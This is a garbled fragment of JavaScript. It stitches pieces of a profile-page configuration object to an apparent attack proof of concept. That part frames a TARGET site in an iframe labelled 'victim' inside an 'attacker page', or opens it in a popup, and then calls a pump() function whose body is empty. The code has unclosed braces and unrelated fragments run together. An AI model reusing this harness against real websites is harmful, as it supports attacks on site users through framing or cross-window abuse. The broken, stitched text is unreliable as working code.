    borderColor: "#0000", cardBorder: "#1a1716", verifyColor: "#5865F2",
    cursor: null, textGlow: false, cardTilting: false

  backgroundEffect: null,
  blocks: [
    { id: "legacy-avatar", type: "avatar", order: 0, visible: true,

    { id: "legacy-bio", type: "bio", order: 1, visible: true,

function pump(w) {

    try {

}

  if (MODE === 'iframe') {
    const f = document.createElement('iframe');
    f.id = 'victim';
    f.style.cssText = 'width:100%;height:700px;border:2px solid red';
    f.src = TARGET;
    document.body.appendChild(f);
    f.addEventListener('load', () => pump(f.contentWindow));
    log('iframe mode: victim framed inside attacker page');
  } else {
    let w = window.open(TARGET, 'vcproof', 'width=1150,height=950');
    if (!w) w = window.open(TARGET, '_blank');
    if (!w) w = window.open(TARGET);
    if (!w) { log('popup blocked'); return; }

    setTimeout(() => pump(w), 1500);
